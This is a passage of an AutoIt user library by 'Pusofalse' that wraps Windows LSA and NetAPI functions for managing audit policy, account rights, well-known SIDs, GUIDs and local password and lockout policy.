		$pSystem = DllStructGetPtr($tSystem)
		$tName = DllStructCreate("wchar[" & $iLength & "]")
		$pName = DllStructGetPtr($tName)
		DllStructSetData($tName, 1, $sSystem)
		DllStructSetData($tSystem, "Length", $iLength)
		DllStructSetData($tSystem, "MaxLength", $iLength + 2)
		DllStructSetData($tSystem, "Wbuffer", $pName)
	EndIf
	$tObjAttr = DllStructCreate($tagLSAOBJATTR)
	$pObjAttr = DllStructGetPtr($tObjAttr)
	$hPolicy = DllCall("Advapi32.dll", "dword", "LsaOpenPolicy", _
			"ptr", $pSystem, "ptr", $pObjAttr, _
			"dword", $iAccessMask, "hWnd*", 0)
	_FreeVariable($tName)
	_FreeVariable($tObjAttr)
	_FreeVariable($tSystem)
	Return SetError(_LsaNtStatusToWinError($hPolicy[0]), 0, $hPolicy[4])
EndFunc	;==>_LsaOpenPolicy

; #### FUNCTION ####
; =======================================================================
; Name	: _AdjustPolicyAuditEvents
; Description	: This function adjusts the system's auditing policy rules.
; Parameter(s)	: $aAudit	- An array with following format:
;		:	- $aAudit[0][0]	- The first policy event to set, see POLICY AUDIT EVENT OPTION CONSTANTS for a value.
;		:	- $aAudit[0][1]	- Auditing options of the first policy event, see POLICY AUDIT EVENT CONSTANTS for values.
;		:	- $aAudit[1][0]	- The second policy event.
;		:	- $aAudit[1][1]	- Auditing options of the second policy event.
;		:	- ... ...
;		: $sSystem	- An optional string value contains the system name on which the function executes, default to local system.
; Return values	: If succeeds, returns true, else returns false and sets @error to a system error code.
; Author	: Pusofalse
; =======================================================================
Func _AdjustPolicyAuditEvents($aAudit, $fAuditMode = True, $sSystem = "")
	Local $hPolicy, $tBuffer, $pBuffer, $tAudit, $pAudit, $iResult
	Local $aAudits[9] = ["System", "Logon", "ObjectAccess", _
			"PrivilegeUse", "DetailedTracking", "PolicyChange", _
			"AccountManagement", "DirectoryServiceAccess", "AccountLogon"]

	If Ubound($aAudit, 0) <> 2 Then Return SetError($ERROR_INVALID_DATA, 0, 0)
	If Ubound($aAudit, 2) <> 2 Then Return SetError($ERROR_INVALID_DATA, 0, 0)

	$hPolicy = _LsaOpenPolicy($POLICY_SET_AUDIT_REQUIREMENTS, $sSystem)
	If $hPolicy = 0 Then Return SetError(@error, 0, 0)
	
	$tBuffer = DllStructCreate($tagPOLICYAUDITEVENTSINFO)
	$pBuffer = DllStructGetPtr($tBuffer)
	$tAudit = DllStructCreate("int Audit[9]")
	$pAudit = DllStructGetPtr($tAudit)

	For $i = 1 to 9
		DllStructSetData($tAudit, 1, $POLICY_AUDIT_EVENT_UNCHANGED, $i)
	Next
	For $i = 0 to Ubound($aAudit) - 1
		For $j = 0 to 8
			If $aAudit[$i][0] = "AuditCategory" & $aAudits[$j] Then
				DllStructSetData($tAudit, 1, $aAudit[$i][1], $j + 1)
				ExitLoop
			EndIf
		Next
	Next

	DllStructSetData($tBuffer, "AuditMode", $fAuditMode)
	DllStructSetData($tBuffer, "EventAuditOpt", $pAudit)
	DllStructSetData($tBuffer, "MaxAuditEventCount", 9)

	$iResult = DllCall("Advapi32.dll", "dword", "LsaSetInformationPolicy", _
			"hWnd", $hPolicy, "dword", 2, "ptr", $pBuffer)
	_LsaClose($hPolicy)
	_FreeVariable($tAudit)
	_FreeVariable($tBuffer)
	Return SetError(_LsaNtStatusToWinError($iResult[0]), 0, $iResult[0] = 0)
EndFunc	;==>_AdjustPolicyAuditEvents

; #### FUNCTION ####
; =======================================================================
; Name	: _QueryPolicyAuditEvents
; Description	: Returns the policy audit events.
; Parameter(s)	: $sSystem	- The name of the system on which the function executes, default to local.
; Return values	: If succeeds, returns an array in the following format:
;		: - $aArray[0][0] - The number of returned entries.
;		: - $aArray[1][0] - The name of the policy audit.
;		: - $aArray[1][1] - The events of the policy audit.
;		: - ... ...
; Author	: Pusofalse
; =======================================================================
Func _QueryPolicyAuditEvents($sSystem = "")
	Local $hPolicy, $iResult, $tBuffer, $tAudit, $pAudit, $aResult[1][2] = [[0]]
	Local $aAuditEvent[9] = ["System", "Logon", "ObjectAccess", _
			"PrivilegeUse", "DetailedTracking", "PolicyChange", _
			"AccountManagement", "DirectoryServiceAccess", "AccountLogon"]

	$hPolicy = _LsaOpenPolicy($POLICY_VIEW_AUDIT_INFORMATION, $sSystem)
	If $hPolicy = 0 Then Return SetError(@error, 0, $aResult)

	$iResult = DllCall("Advapi32.dll", "dword", "LsaQueryInformationPolicy", _
			"hWnd", $hPolicy, "dword", 2, "ptr*", 0)
	If $iResult[0] Then Return SetError(_LsaNtStatusToWinError($iResult[0]), _LsaClose($hPolicy), $aResult)

	$tBuffer = DllStructCreate($tagPOLICYAUDITEVENTSINFO, $iResult[3])
	$aResult[0][0] = DllStructGetData($tBuffer, "MaxAuditEventCount")
	Redim $aResult[$aResult[0][0] + 1][2]

	$pAudit = DllStructGetData($tBuffer, "EventAuditOpt")
	$tAudit = DllStructCreate("int Audit[" & $aResult[0][0] & "]", $pAudit)
	For $i = 1 to $aResult[0][0]
		$aResult[$i][0] = "AuditCategory" & $aAuditEvent[$i - 1]
		$aResult[$i][1] = DllStructGetData($tAudit, "Audit", $i)
	Next
	_LsaClose($hPolicy)
	_FreeVariable($tAudit)
	_FreeVariable($tBuffer)
	Return $aResult
EndFunc	;==>_QueryPolicyAuditEvents

; #### FUNCTION ####
; =======================================================================
; Name	:_LsaClose
; Description	: Close the handle to the policy object.
; Parameter(s)	: $hPolicy	- Handle to the policy, returned by _LsaOpenPolicy function.
; Return values	: True indicates success, false to failure, in which case, @error is set to a system error code.
; Author	: Pusofalse
; =======================================================================
Func _LsaClose($hPolicy)
	Local $iResult
	$iResult = DllCall("Advapi32.dll", "dword", "LsaClose", "hWnd", $hPolicy)
	Return SetError(_LsaNtStatusToWinError($iResult[0]), 0, $iResult = 0)
EndFunc	;==>_LsaClose

; #### FUNCTION ####
; =======================================================================
; Name	: _LsaEnumerateAccountRights
; Description	: This function lists the user rights of the specified user account.
; Parameter(s)	: $sUserAccount	- User account from which the user rights are retrieved.
;		: $sSystem	- System on which the function works, default to local.
; Return values	: If success, return an array contains the user rights, else sets @error to system error code.
; Author	: Pusofalse
; =======================================================================
Func _LsaEnumerateAccountRights($sUserAccount, $sSystem = "")
	Local $iResult, $hPolicy, $pSid, $aResult[1]
	Local $tBuffer, $tagBuffer, $iLength, $tName

	$hPolicy = _LsaOpenPolicy($POLICY_LOOKUP_NAMES, $sSystem)
	If $hPolicy = 0 Then Return SetError(@error, 0, 0)
	$pSid = _LookupAccountName($sUserAccount, $sSystem)
	If Not _IsValidSid($pSid) Then Return SetError(@error, _LsaClose($hPolicy), 0)
	$iResult = DllCall("Advapi32.dll", "dword", "LsaEnumerateAccountRights", _
			"hWnd", $hPolicy, "ptr", $pSid, "ptr*", 0, "ulong*", 0)
	$aResult[0] = $iResult[4]
	Redim $aResult[$aResult[0] + 1]
	For $i = 1 to $aResult[0]
		$tagBuffer &= "ushort[2];ptr;"
	Next
	$tBuffer = DllStructCreate($tagBuffer, $iResult[3])
	For $i = 1 to $aResult[0]
		$iLength = DllStructGetData($tBuffer, ($i - 1) * 2 + 1, 1)
		$tName = DllStructCreate("wchar[" & $iLength & "]", DllStructGetData($tBuffer, ($i - 1) * 2 + 2))
		$aResult[$i] = DllStructGetData($tName, 1)
		$tName = 0
	Next
	_HeapFree($pSid)
	_FreeVariable($tBuffer)
	_LsaClose($hPolicy)
	_LsaFreeMemory($iResult[3])
	Return SetError(_LsaNtStatusToWinError($iResult[0]), 0, $aResult)
EndFunc	;==>_LsaEnumerateAccountRights

; #### FUNCTION ####
; =======================================================================
; Name	: _LsaRemoveAccountRight
; Description	: This function removes an user privilege from an user account.
; Parameter(s)	: $sUserAccount	- The name of the user account from which the right is removed.
;		: $sUserRight	- The name of the user right or privilege to remove, see PRIVILEGE CONSTANTS and USER ACCOUNT RIGHTS CONSTANTS for a value.
;		: $sSystem	- The system on which the function to execute, default to local system.
;		: $fRemoveAll	- If true, the function ignores the $sUserRight parameter, then remove all the user rights from the $sUserAccount. Default to false.
; Return values	: If succeeds, returns true, else returns false and sets @error to system error code.
; Author	: Pusofalse
; =======================================================================
Func _LsaRemoveAccountRight($sUserAccount, $sUserRight, $sSystem = "", $fRemoveAll = false)
	Local $iResult, $pBuffer, $pSid, $hPolicy

	$hPolicy = _LsaOpenPolicy($POLICY_LOOKUP_NAMES, $sSystem)
	If Not $hPolicy Then Return SetError(@error, 0, 0)
	$pSid = _LookupAccountName($sUserAccount, $sSystem)
	If Not _IsValidSid($pSid) Then Return SetError(@error, _LsaClose($hPolicy), 0)

	$pBuffer = _LsaInitializeBufferW($sUserRight)
	$iResult = DllCall("Advapi32.dll", "dword", "LsaRemoveAccountRights", _
			"hWnd", $hPolicy, "ptr", $pSid, "int", $fRemoveAll, _
			"ptr", $pBuffer, "ulong", 1)
	_HeapFree($pSid)
	_HeapFree($pBuffer)
	_LsaClose($hPolicy)
	Return SetError(_LsaNtStatusToWinError($iResult[0]), 0, $iResult[0] = 0)
EndFunc	;==>_LsaRemoveAccountRight

; #### FUNCTION ####
; =======================================================================
; Name	: _LsaInitializeBufferW
; Description	: The function initializes a tagLSAUNICODE structure.
; Parameter(s)	: $sData	- Data to initialize.
;		: $fDecode	- If true, the $sData parameter must be a pointer to a LSAUNICODE structure, in which case, the function returns the data stored in the buffer. If false, the function initializes a LSAUNICODE structure by using the $sData, return value is set to a pointer to LSAUNICODE structure.
; Return values	: Depends on $fDecode parameter.
; Author	: Pusofalse
; Remarks		: When you finished with this pointer, call _HeapFree function to free it.
; =======================================================================
Func _LsaInitializeBufferW($sData, $fDecode = False)
	Local $pMem, $iLength, $tBuffer, $sResult

	If $fDecode = False Then
		$iLength = StringLen($sData) * 2 + 2
		$pMem = _HeapAlloc($iLength + 8)
		$tBuffer = DllStructCreate($tagLSAUNICODE & ";wchar Data[" & $iLength - 2 & "]", $pMem)
		DllStructSetData($tBuffer, "Length", $iLength - 2)
		DllStructSetData($tBuffer, "MaxLength", $iLength)
		DllStructSetData($tBuffer, "Wbuffer", $pMem + 8)
		DllStructSetData($tBuffer, "Data", $sData)
		Return $pMem
	ElseIf Not IsPtr($sData) Then
		Return ""
	EndIf

	$tBuffer = DllStructCreate($tagLSAUNICODE, $sData)
	$iLength = DllStructGetData($tBuffer, "MaxLength") * 2
	If $iLength < 1 Then Return ""
	$pMem = DllStructCreate("wchar Data[" & $iLength & "]", DllStructGetData($tBuffer, "Wbuffer"))
	$sResult = DllStructGetData($pMem, "Data")
	Return SetExtended(_FreeVariable($pMem), $sResult)
EndFunc	;==>_LsaInitializeBufferW

; #### FUNCTION ####
; =======================================================================
; Name	: _LsaAddAccountRight
; Description	: This function assigns one privilege to an user account.
; Parameter(s)	: $sUserAccount	- The name of the user account.
;		: $sUserRight	- The name of the user right, see PRIVILEGE CONSTANTS and USER ACCOUNT RIGHTS CONSTANTS.
;		: $sSystem	- The system on which the function executes.
; Return values	: True indicates success, false to failure - sets @error to a system error code.
; Author	: Pusofalse
; =======================================================================
Func _LsaAddAccountRight($sUserAccount, $sUserRight, $sSystem = "")
	Local $hPolicy, $pSid, $iResult, $pBuffer, $iAccessMask

	$iAccessMask = bitOR($POLICY_LOOKUP_NAMES, $POLICY_CREATE_ACCOUNT)
	$hPolicy = _LsaOpenPolicy($iAccessMask, $sSystem)
	If Not $hPolicy Then Return SetError(@error, 0, 0)
	$pSid = _LookupAccountName($sUserAccount, $sSystem)
	If Not _IsValidSid($pSid) Then Return SetError(@error, _LsaClose($hPolicy), 0)

	$pBuffer = _LsaInitializeBufferW($sUserRight)
	$iResult = DllCall("Advapi32.dll", "dword", "LsaAddAccountRights", _
			"hWnd", $hPolicy, "ptr", $pSid, _
			"ptr", $pBuffer, "ulong", 1)
	_HeapFree($pSid)
	_HeapFree($pBuffer)
	_LsaClose($hPolicy)
	Return SetError(_LsaNtStatusToWinError($iResult[0]), 0, $iResult[0] = 0)
EndFunc	;==>_LsaAddAccountRight

; #### FUNCTION ####
; =======================================================================
; Name	: _LsaAccountRightIsEnabled
; Description	: This function determines the specified user right whether is assigned to the specified user account.
; Parameter(s)	: $sUserAccount	- The name of the user account.
;		: $sUserRight	- The name of the user right.
;		: $sSystem	- The system on which the function to execute.
; Return values	: If no errors occour, the @error is set to zero. If $sUserRight is assigned to $sUserAccount, returns true, else returns false.
; Author	: Pusofalse
; =======================================================================
Func _LsaAccountRightIsEnabled($sUserAccount, $sUserRight, $sSystem = "")
	Local $aRight, $iSysError
	$aRight = _LsaEnumerateAccountRights($sUserAccount, $sSystem)
	$iSysError = @error
	For $i = 1 to $aRight[0]
		If $aRight[$i] = $sUserRight Then Return SetError($iSysError, _FreeVariable($aRight), True)
	Next
	Return SetError($iSysError, _FreeVariable($aRight), False)
EndFunc	;==>_LsaAccountRightIsEnabled

; #### FUNCTION ####
; =======================================================================
; Name	: _LsaLookupAccountsRight
; Description	: Compares rights of 2 user accounts and retrieves the higher one of them.
; Parameter(s)	: $pUser1	- First user account's SID pointer, or an user name string.
;		: $pUser2	- Second user account's SID pointer, or an user name string.
; Return values	: If $pUser1's user right is higher than $pUser2's ( or equals to), the return value is same to $pUser1, -
;		: + otherwise, returns $pUser2 parameter. -
;		: + If $pUser1 or $pUser2 is invalid user account SID or string, @error is set to  ERROR_INVALID_SID. -
;		: + If $pUser1 or $pUser2 is not a local group alias or not a local user name, @error is set to ERROR_INVALID_DATA. -
;		: + If @error is non-zero, @extended is set to the index of the wrong parameter.
; Author	: Pusofalse
; Remarks		: Note that $pUser1 and $pUser2 must be SID pointer or user name string to a local group or local user, but not a well-known account.
; =======================================================================
Func _LsaLookupAccountsRight($pUser1, $pUser2)
	Local $aSid[2] = [$pUser1, $pUser2],$aRid[2], $aGroup[2],$aType[2],$aAlias[2],$vTemp

	For $i = 0 to 1
		If Not _IsValidSid($aSid[$i]) Then
			$aSid[$i] = _LookupAccountName($aSid[$i])
			If Not _IsValidSid($aSid[$i]) Then Return SetError(@error,$i + 1,"")
		EndIf
		$aAlias[$i] = $aSid[$i]
		$aGroup[$i] = _LookupAccountSid($aSid[$i])
		$aType[$i] = @Extended
		If ($aType[$i] <> $SID_IS_USER) AND ($aType[$i] <> $SID_IS_ALIAS) Then
			Return SetError($ERROR_INVALID_DATA, $i + 1, "")
		EndIf
		If $aType[$i] = $SID_IS_USER Then
			$vTemp = _LsaLocalUserGetGroups($aGroup[$i])
			If $vTemp[0] = 0 Then Return SetError(-1, $i + 1, "")
			$aAlias[$i] = _LookupAccountName($vTemp[1])
		EndIf
		Switch _GetSidSubAuthority($aAlias[$i], 1)
		Case $DOMAIN_ALIAS_RID_ADMINS
			$aRid[$i] = 1
		Case $DOMAIN_ALIAS_RID_POWER_USERS
			$aRid[$i] = 2
		Case $DOMAIN_ALIAS_RID_USERS
			$aRid[$i] = 3
		Case $DOMAIN_ALIAS_RID_GUESTS
			$aRid[$i] = 4
		Case Else
			$aRid[$i] = 5
		EndSwitch
		_HeapFree($aSid[$i])
	Next
	_FreeVariable($aAlias)
	_FreeVariable($aGroup)
	If $aRid[0] <= $aRid[1] Then
		Return $pUser1
	Else
		Return $pUser2
	EndIf
EndFunc	;==>_LsaLookupAccountsRight

; #### INTERNAL USED ONLY FUNCTION ####
; =======================================================================
; Just converts the return value of the _Lsa* functions to a system error code.
; =======================================================================
Func _LsaNtStatusToWinError($iNtStatus)
	Local $iSysError
	$iSysError = DllCall("Advapi32.dll", "ulong", "LsaNtStatusToWinError", "dword", $iNtStatus)
	Return $iSysError[0]
EndFunc	;==>_LsaNtStatusToWinError

; #### INTERNAL USED ONLY FUNCTION ####
; =======================================================================
Func _LsaFreeMemory($pMem)
	Local $iResult = DllCall("Advapi32.dll", "dword", "LsaFreeMemory", "ptr", $pMem)
	Return SetError(_LsaNtStatusToWinError($iResult[0]), 0, $iResult[0] = 0)
EndFunc	;==>_LsaFreeMemory

; #### FUNCTION ####
; =======================================================================
; Name	: _LsaEnumerateAccountsWithUserRight
; Description	: Returns an array contains the user accounts that hold the specified user right.
; Parameter(s)	: $sUserRight	- User right.
;		: $sSystem	- The system on which the function executes, default to local.
; Return values	: If success, returns an array in the form:
;		:	- $aArray[0][0]	- The number of entry returned.
;		:	- $aArray[1][0]	- The name of the first user account.
;		:	- $aArray[1][1]	- The SID of the first user account, in string format.
;		:	... ...
;		: If failure, @error is set to a system error code, and $aArray[0][0] is set to zero.
; Author	: Pusofalse
; =======================================================================
Func _LsaEnumerateAccountsWithUserRight($sUserRight, $sSystem = "")
	Local $iResult, $hPolicy, $pBuffer, $tSid, $pSid, $iAccessMask, $aResult[1][2] = [[0]]

	$iAccessMask = bitOR($POLICY_LOOKUP_NAMES, $POLICY_VIEW_LOCAL_INFORMATION)
	$hPolicy = _LsaOpenPolicy($iAccessMask, $sSystem)
	If Not $hPolicy Then Return SetError(@error, 0, $aResult)

	$pBuffer = _LsaInitializeBufferW($sUserRight)
	$iResult = DllCall("Advapi32.dll", "dword", "LsaEnumerateAccountsWithUserRight", _
			"hWnd", $hPolicy, "ptr", $pBuffer, "ptr*", 0, "int*", 0)
	$aResult[0][0] = $iResult[4]
	Redim $aResult[$aResult[0][0] + 1][2]

	$tSid = DllStructCreate("ptr[" & $iResult[4] & "]", $iResult[3])
	For $i = 1 to $aResult[0][0]
		$pSid = _CopySid(DllStructGetData($tSid, 1, $i))
		$aResult[$i][0] = _LookupAccountSid($pSid)
		$aResult[$i][1] = _ConvertSidToStringSid($pSid)
		_HeapFree($pSid)
	Next
	_LsaClose($hPolicy)
	_FreeVariable($tSid)
	_HeapFree($pBuffer)
	_LsaFreeMemory($iResult[3])
	Return SetError(_LsaNtStatusToWinError($iResult[0]), 0, $aResult)
EndFunc	;==>_LsaEnumerateAccountsWithUserRight

; #### FUNCTION ####
; =======================================================================
; Name	: _CreateWellKnownSid
; Description	: The function creates a SID for predefined aliases.
; Parameter(s)	: $iSidType	- One member of WELL KNOWN SID TYPE enumeration.
;		: $pDomainSid	- A pointer to a SID that identifies the domain control to use when creating the SID. Pass NULL to use the local computer.
; Return values	: If succeeds, returns a pointer to the well-known SID, when you finished with this pointer, call _HeapFree function to free it.
; Author	: Pusofalse
; =======================================================================
Func _CreateWellKnownSid($iSidType, $pDomainSid = 0)
	Local $iResult, $pSid

	If $iSidType < 0 or $iSidType > 78 Then Return SetError($ERROR_INVALID_PARAMETER, 0, 0)
	If $pDomainSid And Not _IsValidSid($pDomainSid) Then Return SetError(@error, 0, 0)
	$iResult = DllCall("Advapi32.dll", "int", "CreateWellKnownSid", _
			"int", $iSidType, "ptr", $pDomainSid, "ptr*", 0, "int*", 0)
	$pSid = _HeapAlloc($iResult[4])
	$iResult = DllCall("Advapi32.dll", "int", "CreateWellKnownSid", _
			"int", $iSidType, "ptr", $pDomainSid, "ptr", $pSid, "int*", $iResult[4])
	Return SetError(_GetLastError(), 0, $pSid)
EndFunc	;==>_CreateWellKnownSid

; #### FUNCTION ####
; =======================================================================
; Name	: _AllocatedLUID
; Description	: Allocates a local unique identifier for the caller.
; Parameter(s)	: $sNameAssoc	- The name associated to the LUID, can be in any format. If non-null, use Eval function to retrieve the value of LUID.
; Return values	: If succeeds, the return value is a LUID value in 8 bytes. Use _LsaLoLong64 function to retrieve the low part of the LUID, _LsaHiLong64 to high part of the LUID.
; Author	: Pusofalse
; =======================================================================
Func _AllocateLUID($sNameAssoc = "")
	Local $pLuid, $tLuid, $iLuid, $iSysError, $iLow, $iHigh, $iResult

	$pLuid = _InitializeLuid(0, 0)
	$iResult = DllCall("Advapi32.dll", "int", "AllocateLocallyUniqueId", "ptr", $pLuid)
	$iSysError = _GetLastError()
	$tLuid = DllStructCreate($tagLUID, $pLuid)
	$iLow = DllStructGetData($tLUID, "Low")
	$iHigh = DllStructGetData($tLUID, "High")
	_HeapFree($pLuid)
	_FreeVariable($tLuid)
	$iLuid = _LsaMakeLong64($iLow, $iHigh)
	If $sNameAssoc <> "" Then Assign($sNameAssoc, $iLuid, 2)
	Return SetError($iSysError, ($iResult[0] <> 0), $iLuid)
EndFunc	;==>_AllocateLUID

; #### FUNCTION ####
; =======================================================================
; Name	: _AllocateGUID
; Description	: Allocates a global unique identifier for the caller.
; Parameter(s)	: This function has no parameters.
; Return values	: If succeeds, returns a pointer to a GUID structure contains the newly allocated GUID. If fails, @error is set non-zero.
; Author	: Pusofalse
; =======================================================================
Func _AllocateGUID()
	Local $pGUID = _HeapAlloc(16), $iResult
	$iResult = DllCall("Ole32.dll", "int", "CoCreateGuid", "ptr", $pGUID)
	Return SetError($iResult[0], 0, $pGUID)
EndFunc	;==>_AllocateGUID

; #### FUNCTION ####
; =======================================================================
; Name	: _StringFromGUID
; Description	: Retrieves the GUID in string format.
; Parameter(s)	: $pGUID	- A pointer to a GUID.
; Return values	: GUID in string format.
; Author	: Pusofalse
; =======================================================================
Func _StringFromGUID($pGUID)
	Local $iResult

	If IsDllStruct($pGUID) Then $pGUID = DllStructGetPtr($pGUID)
	$iResult = DllCall("Ole32.dll", "int", "StringFromGUID2", _
			"ptr", $pGUID, "wstr", "", "int", 128)
	Return $iResult[2]
EndFunc	;==>_StringFromGUID

; #### FUNCTION ####
; =======================================================================
; Name	: _GUIDFromString
; Description	: Converts a string GUID (globally unique identifier) to a GUID structure.
; Parameter(s)	: $sGUID	- GUID string.
; Return values	: If succeeds, @error is set to zero, otherwise sets to non-zero. The return value is a GUID structure.
; Author	: Pusofalse
; =======================================================================
Func _GUIDFromString($sGUID)
	Local $tGUID = DllStructCreate("byte Guid[16]"), $iResult

	$iResult = DllCall("Ole32.dll", "int", "CLSIDFromString", "wstr", $sGUID, "ptr", DllStructGetPtr($tGUID))
	Return SetError($iResult[0], 0, $tGUID)
EndFunc	;==>_GUIDFromString

; #### FUNCTION ####
; =======================================================================
; Name	: _LsaEnumerateWellKnownAccounts
; Description	: This function lists all the well known accounts in the local system.
; Parameter(s)	: This function has no parameters.
; Return values	: An array with following format:
;		:	- $aArray[0][0]	- The number of accounts returned.
;		:	- $aArray[1][0]	- The name of first well known account.
;		:	- $aArray[1][1]	- The SID of first well known account, in string format.
;		:	- $aArray[2][0]	- The name of second well known account.
;		:	- ... ...
; Author	: Pusofalse
; =======================================================================
Func _LsaEnumerateWellKnownAccounts()
	Local $pSid, $aResult[1][2] = [[0]]

	For $i = 0 to 78
		$pSid = _CreateWellKnownSid($i)
		If Not _IsValidSid($pSid) Then ContinueLoop
		$aResult[0][0] += 1
		Redim $aResult[$aResult[0][0] + 1][2]
		$aResult[$aResult[0][0]][0] = _LookupAccountSid($pSid)
		$aResult[$aResult[0][0]][1] = _ConvertSidToStringSid($pSid)
		_HeapFree($pSid)
	Next
	Return $aResult
EndFunc	;==>_LsaEnumerateWellKnownAccounts

; #### FUNCTION ####
; =======================================================================
; Name	: _LsaLocalUserGePasswordPolicy
; Description	: Returns the password policy on specified system.
; Parameter(s)	: $sSystem	- Specifies the system on which the function executes, default to local.
; Return values	: If succeeds, returns an array in the format:
;		:	- $aArray[0]	- The minimum password length requires.
;		:	- $aArray[1]	- The maximum password age.
;		:	- $aArray[2]	- The minimum password age.
;		:	- $aArray[3]	- Timeout of force-logoff, in seconds.
;		:	- $aArray[4]	- Password's history length.
; Author	: Pusofalse
; =======================================================================
Func _LsaLocalUserGetPasswordPolicy($sSystem = "")
	Local $tBuffer, $pBuffer, $iResult, $aResult[5]

	$iResult = DllCall("Netapi32.dll", "long", "NetUserModalsGet", _
			"wstr", $sSystem, "dword", 0, "ptr*", 0)
	$tBuffer = DllStructCreate($tagLSAUSERMODALS, $iResult[3])
	$aResult[0] = DllStructGetData($tBuffer, "MinPwdLen")
	$aResult[1] = DllStructGetData($tBuffer, "MaxPwdAge")
	$aResult[2] = DllStructGetData($tBuffer, "MinPwdAge")
	$aResult[3] = DllStructGetData($tBuffer, "ForceLogoff")
	$aResult[4] = DllStructGetData($tBuffer, "PwdHistLen")
	_LsaApiBufferFree($iResult[3])
	Return SetError($iResult[0], _FreeVariable($tBuffer), $aResult)
EndFunc	;==>_LsaLocalUserGetPasswordPolicy

; #### FUNCTION ####
; ==============================================================================
; Name	: _LsaLocalUserSetInfo
; Description	: This function sets the user account information on the specified system.
; Parameter(s)	: $sUserName	- Specifies the user name for which to set information.
;		: $iLevel	- Specifies the information level of the data, see Msdn link for details.
;		: $pBuffer	- A pointer to a buffer that contains the information data.
;		: $sBufferType	- Specifies the type of the $pBuffer parameter, default it is recognized as a pointer.
;		: $sSystem	- System name on which the function executes, default to local.
; Return values	: Returns true if succeeds, false otherwise, in this case, @error is set to a system error code.
; Author	: Pusofalse
; Link	: http://msdn.microsoft.com/en-us/library/aa370659(VS.85).aspx
; ==============================================================================
Func _LsaLocalUserSetInfo($sUserName, $iLevel, $pBuffer, $sBufferType = "ptr", $sSystem = "")
	Local $iResult

	$iResult = DllCall("Netapi32.dll", "long", "NetUserSetInfo", "wstr", $sSystem, _
			"wstr", $sUserName, "dword", $iLevel, _
			$sBufferType, $pBuffer, "dword*", 0)
	If (@error) Then Return SetError(87, 0, False)
	Return SetError($iResult[0], 0, $iResult[0] = 0)
EndFunc	;==>_LsaLocalUserSetInfo

; #### FUNCTION ####
; ==============================================================================
; Name	: _LsaLocalUserSetAttributes
; Description	: This function sets the user account attributes.
; Parameter(s)	: $sUserName	- User for which to set.
;		: $iFlags	- User flags, see Msdn link for details.
;		: $sSystem	- System on which to execute.
; Return values	: Returns true if no error occurs, otherwise false, @error is a system error code.
; Author	: Pusofalse
; Link	: http://msdn.microsoft.com/en-us/library/aa370968(VS.85).aspx
; ==============================================================================
Func _LsaLocalUserSetAttributes($sUserName, $iFlags, $sSystem = "")
	Local $iResult = _LsaLocalUserSetInfo($sUserName, 1008, $iFlags, "dword*", $sSystem)
	Return SetError(@error, 0, $iResult)
EndFunc	;==>_LsaLocalUserSetAttributes

; #### FUNCTION ####
; ==============================================================================
; Name	: _LsaLocalUserSetPassword
; Description	: This function changes the password for an existing user account.
; Parameter(s)	: $sUserName	- User name for which the password is set.
;		: $sPswd	- Password, in string format.
;		: $sSystem	- System on which the function executes.
; Return values	: True indicates success, false indicates failure.
; Author	: Pusofalse
; ==============================================================================
Func _LsaLocalUserSetPassword($sUserName, $sPswd, $sSystem = "")
	Local $iResult = _LsaLocalUserSetInfo($sUserName, 1003, $sPswd, "wstr*", $sSystem)
	Return SetError(@error, 0, $iResult)
EndFunc	;==>_LsaLocalUserSetPassword

; #### FUNCTION ####
; =======================================================================
; This function is only internal used, _LsaLocalUserSet* functions require this function.
; =======================================================================
Func _LsaLocalUserSetModals($iLevel, $pBuffer, $sParam = "ptr", $sSystem = "")
	Local $iResult

	$iResult = DllCall("Netapi32.dll", "long", "NetUserModalsSet", _
			"wstr", $sSystem, "dword", $iLevel, $sParam, $pBuffer, "int*", 0)
	Return SetError($iResult[0], 0, $iResult[0] = $ERROR_SUCCESS)
EndFunc	;==>_LsaLocalUserSetModals

; #### FUNCTION ####
; =======================================================================
; Name	: _LsaLocalUserSetMinPasswordLength
; Description	: Sets the minimum password length on specified system.
; Parameter(s)	: $iLength		- The minimum length of the password.
;		: $sSystem	- The system on which the function to execute, default to local.
; Return values	: True indicates success, false to failure.
; Author	: Pusofalse
; =======================================================================
Func _LsaLocalUserSetMinPasswordLength($iLength, $sSystem = "")
	Local $iResult

	$iResult = _LsaLocalUserSetModals(1001, $iLength, "dword*", $sSystem)
	Return SetError(@error, 0, $iResult)
EndFunc	;==>_LsaLocalUserSetMinPasswordLength

; #### FUNCTION ####
; =======================================================================
; Name	: _LsaLocalUserSetMaxPasswordAge
; Description	: This function is used to set the maximum password age.
; Parameter(s)	: $iAge	- The age value.
;		: $iSystem	- The system on which the function is to execute.
; Return values	: True indicates success, false to failure.
; =======================================================================
Func _LsaLocalUserSetMaxPasswordAge($iAge, $sSystem = "")
	Local $iResult

	$iResult = _LsaLocalUserSetModals(1002, $iAge, "dword*", $sSystem)
	Return SetError(@error, 0, $iResult)
EndFunc	;==>_LsaLocalUserSeMaxPasswordAge

; #### FUNCTION ####
; =======================================================================
; Name	: _LsaLocalUserSetMinPasswordAge
; Description	: This function sets the minimum passoword age.
; Parameter(s)	: $iAge	- The minimum age value.
;		: $sSystem	- The system on which the function executes.
; Return values	: If succeeds, returns true, else returns false and sets @error to a system error code.
; Author	: Pusofalse
; =======================================================================
Func _LsaLocalUserSetMinPasswordAge($iAge, $sSystem = "")
	Local $iResult

	$iResult = _LsaLocalUserSetModals(1003, $iAge, "dword*", $sSystem)
	Return SetError(@error, 0, $iResult)
EndFunc	;==>_LsaLocalUserSeMinPasswordAge

Func _LsaLocalUserSetForceLogoff($iTimeout, $sSystem = "")
	Local $iResult

	$iResult = _LsaLocalUserSetModals(1004, $iTimeout, "dword*", $sSystem)
	Return SetError(@error, 0, $iResult)
EndFunc	;==>_LsaLocalUserSetForceLogoff

Func _LsaLocalUserSetPasswordHistLength($iLength, $sSystem = "")
	Local $iResult

	$iResult = _LsaLocalUserSetModals(1005, $iLength, "dword*", $sSystem)
	Return SetError(@error, 0, $iResult)
EndFunc	;==>_LsaLocalUserSetPasswordHistLength

Func _LsaLocalUserSetLockout($iThreshold, $iDuration, $iObservation, $sSystem = "")
	Local $iResult, $tBuffer, $pBuffer

	$tBuffer = DllStructCreate($tagUSERMODALSINFO3)
	$pBuffer = DllStructGetPtr($tBuffer)
	DllStructSetData($tBuffer, "Duration", $iDuration)
	DllStructSetData($tBuffer, "ObservationWin", $iObservation)
	DllStructSetData($tBuffer, "Threshold", $iThreshold)
	
	$iResult = _LsaLocalUserSetModals(3, $pBuffer, "ptr", $sSystem)
	Return SetError(@error, _FreeVariable($tBuffer), $iResult)
EndFunc	;==>_LsaLocalUserSetLockout

